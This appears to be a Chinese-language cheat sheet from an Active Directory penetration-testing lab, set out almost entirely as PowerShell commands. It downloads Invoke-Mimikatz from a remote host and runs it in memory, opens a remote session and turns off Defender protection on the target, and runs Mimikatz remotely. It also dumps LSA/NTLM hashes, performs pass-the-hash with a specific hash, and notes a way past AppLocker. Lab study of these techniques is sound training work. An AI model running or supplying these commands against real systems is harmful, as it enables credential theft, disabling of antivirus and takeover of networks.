# 引入Invoke-Mimikatz.ps1，并且在内存中执行
```
iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)
```


# 横向执行Mimikatz
从上面我们已经知道当前账号ciadmin可以横向登录到计算机dcorp-mgmt.dollarcorp.moneycorp.local，我们把登录的session保存在$sess
```$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local```

指定目标靶机的session，在目标靶机关闭杀软（效果跟bypass AMSI大同小异，不过因为我们是目标靶机上的管理员，因此可以直接关闭）
```Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess```

指定目标靶机的session，在目标靶机执行Mimikatz
```Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess```


# 导出所有ntml 哈希
```
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
```

# 导出本地所有用户的NTML
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

# 生成某个用户命令的shell（需要NTML） Over the hash
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
```

# Mimikatz.ps1调用自己（适用于有Applocker策略不允许执行ps1脚本的环境）
在Invoke-Mimikatz.ps1文件的最底部，加一行命令：Invoke-Mimikatz





